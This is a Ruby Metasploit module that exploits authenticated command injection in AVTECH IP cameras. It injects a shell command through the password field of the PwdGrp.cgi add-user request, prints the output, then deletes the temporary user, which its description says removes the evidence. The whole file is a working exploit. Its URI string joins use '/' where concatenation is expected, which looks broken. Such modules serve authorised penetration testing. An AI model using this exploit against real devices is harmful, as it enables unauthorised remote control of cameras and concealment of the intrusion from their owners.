##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  TEMP_USER_NAME = 'TempUser4123'

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'AVTECH IP camera authenticated command execution',
      'Description' => %q{
        On some systems a vulnerability exists which allows for authenticated
        remote command execution. The executed code is ran under admin
        privileges. The avtech_ipcam_password_extraction Auxiliary module
        can be used to try to retrieve the credentials. The technique creates
        a new user as an execution artefact, which is then deleted to remove
        the evidence.
      },
      'References' =>
        [
          ['EDB-ID', '40500'],
          ['URL', 'https://www.exploit-db.com/exploits/40500/']
        ],
      'Author' =>
        [
          'Gergely Eberhardt <@ebux25>',                # Initial discovery
          'Andrej Mohar <nutcracker32[at]hotmail.com>'  # Metasploit module
        ],
      'License' => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('HttpUsername', [true, 'User to login with', 'admin']),
        OptString.new('HttpPassword', [true, 'Password to login with', 'admin']),
        OptString.new('CMD', [true, 'The command to execute', 'ls -al']),
        Opt::RHOST(),
        Opt::RPORT(default = 80)
      ])
  end

  def run
    result = execute_code
    print_result(result)
    delete_temp_user
  end

  def execute_code
    command = "echo HTTP/1.0 200 OK;echo;#{datastore['cmd']}".gsub!(' ', '%20')

    # Parameter dictionary wasn't used because the command must not be url-encoded.
    # Only the spaces are encoded as %20
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => '/cgi-bin/supervisor/PwdGrp.cgi?' /
               "action=add&user=#{TEMP_USER_NAME}&" /
               "pwd=;#{command};&" /
               'grp=SUPERVISOR&' /
               'lifetime=5%20MIN',
      'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword'])
    })

    unless res
      fail_with(Failure::Unreachable, 'No response received from the target')
    end

    if res.code == 403
      fail_with(Failure::NoAccess, 'Access is forbidden, try with different user name and password')
    end

    unless res.code == 200
      fail_with(Failure::Unknown, "An unknown error occurred, returned code #{res.code}")
    end

    print_good("Successfully executed command: #{datastore['cmd']}")

    return res.body
  end

  def delete_temp_user
    print_status('Deleting temporary user')
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => '/cgi-bin/supervisor/PwdGrp.cgi',
      'vars_post' => {
        'action' => 'del',
        'user' => TEMP_USER_NAME
      }
    })

    unless res
      fail_with(Failure::Unreachable, 'No response received from the target')
    end

    unless res.code == 200
      fail_with(Failure::Unknown, "An unknown error occurred, returned code #{res.code}")
    end

    print_good("Deleted temporary user #{TEMP_USER_NAME}")
  end

  def print_result(body)
    found_match = %r/HTTP\/.{1,4} 200 OK/.match(body)

    print_good('Result:')
    print_line(body[0, found_match.begin(0)])
  end
end
